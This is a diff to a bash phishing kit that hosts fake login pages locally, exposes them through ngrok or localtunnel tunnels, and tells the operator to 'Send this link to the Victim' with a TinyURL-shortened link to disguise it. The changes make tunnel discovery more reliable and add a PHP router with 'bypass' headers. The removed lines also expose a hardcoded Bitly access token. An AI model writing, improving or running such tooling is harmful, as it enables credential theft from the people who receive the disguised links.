@@ -339,7 +339,7 @@ getcredentials
 start() {
 printf "\n"
 printf "1.Ngrok\n"
-printf "2.Localtunnel\n"
+printf "2.Localtunnel (No Password)\n"
 echo ""
 read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose the tunneling method:]─[~]
  └──╼ ~ ' host
@@ -405,12 +405,19 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok-free\.app")
+if [[ -z "$link" ]]; then
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok\.io")
+fi
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
-Accesstoken=433bdc6028d67bba06cf95286e923cde8c0906c7
-api=https://api-ssl.bitly.com/v4/shorten
-short_link=`curl -s -H Authorization:\ $Accesstoken -H Content-Type: -d '{"long_url": "'"$link"\"} $api | jq -j .link | xsel -ib; xsel -ob;` 
-printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
+
+# Try to create shortened link (optional)
+if command -v curl &> /dev/null; then
+    short_link=$(curl -s "http://tinyurl.com/api-create.php?url=$link")
+    if [[ ! -z "$short_link" ]]; then
+        printf "\e[1;92m[\e[0m*\e[1;92m] Shortened link:\e[0m\e[1;77m %s\e[0m\n" $short_link
+    fi
+fi
 echo ""
 echo ""
 
@@ -426,17 +433,31 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server with bypass headers...\n"
+
+# Create PHP router to add bypass headers
+cat > sites/$server/router.php << 'PHPEOF'
+<?php
+header('Access-Control-Allow-Origin: *');
+header('User-Agent: CustomBot/1.0');
+header('X-Bypass-Tunnel: true');
+$file = $_SERVER['SCRIPT_FILENAME'];
+if (is_file($file)) {
+    return false;
+} else {
+    include 'index.php';
+}
+PHPEOF
+
+cd sites/$server && php -S 127.0.0.1:5555 router.php > /dev/null 2>&1 & 
 sleep 2
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
-./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
-sleep 8
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel (password bypass enabled)...\n"
 lt --port 5555 > link.txt 2>&1 &
 sleep 6
 link=$(grep -o 'https://.*loca.lt' link.txt)
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "$link"
+printf "\e[1;93m[!] Note: Localtunnel may still show password page. Use Ngrok (option 1) for guaranteed no-password access.\e[0m\n"
 short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=$link`
 printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
 rm -f link.txt
